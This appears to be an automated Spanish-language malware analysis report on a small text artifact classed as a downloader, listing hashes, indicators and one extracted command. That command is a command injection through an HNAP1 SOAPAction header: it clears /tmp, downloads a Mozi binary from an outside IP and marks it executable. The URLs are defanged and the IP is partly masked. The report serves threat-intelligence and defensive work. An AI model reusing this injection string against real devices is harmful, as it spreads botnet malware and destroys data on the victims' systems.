# 🧬 Payload Analysis

`73eac8c443e656efaff989d147c7f3613bff1f9c3e96971fceb8a9025fcf0e44`

## 📌 Resumen

Artefacto identificado como ASCII text, with very long lines (531), with CRLF line terminators de 797 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `envelope` en `hxxp://schemas[.]xmlsoap[.]org/soap/envelope/`. Se extrajeron 5 referencias URL únicas. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:19:06.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `73eac8c443e656efaff989d147c7f3613bff1f9c3e96971fceb8a9025fcf0e44`
- **SHA1:** `f5f5a22236aeae93f0f5141c6e6bf72e888c8edf`
- **MD5:** `1e4cf891c13ca333d3507490f5f77609`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (531), with CRLF line terminators |
| Tamaño | 797 B |
| Entropía | 5.42 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with very long lines (531), with CRLF line terminators; iocs=9

## 🖥️ Comandos observados / extraídos

```text
SOAPAction: hxxp://purenetworks[.]com/HNAP1/`cd /tmp && rm -rf * && wget hxxp://119.185.240.XXX:55578/Mozi.m && chmod 777
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://schemas[.]xmlsoap[.]org/soap/envelope/ | strings |
| url | hxxp://119.185.240.XXX:55578/Mozi.m | strings |
| url | hxxp://purenetworks[.]com/HNAP1/ | strings |
| url | hxxp://www[.]w3[.]org/2001/XMLSchema-instance | strings |
| url | hxxp://www[.]w3[.]org/2001/XMLSchema | strings |
| ip | 119.185.240.XXX | static_analysis |
| ip | 190.179.128.XXX | static_analysis |
| command | SOAPAction: hxxp://purenetworks[.]com/HNAP1/`cd /tmp && rm -rf * && wget hxxp://119.185.240.XXX:55578/Mozi.m && chmod 777 | strings |
| hash | 73eac8c443e656efaff989d147c7f3613bff1f9c3e96971fceb8a9025fcf0e44 | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
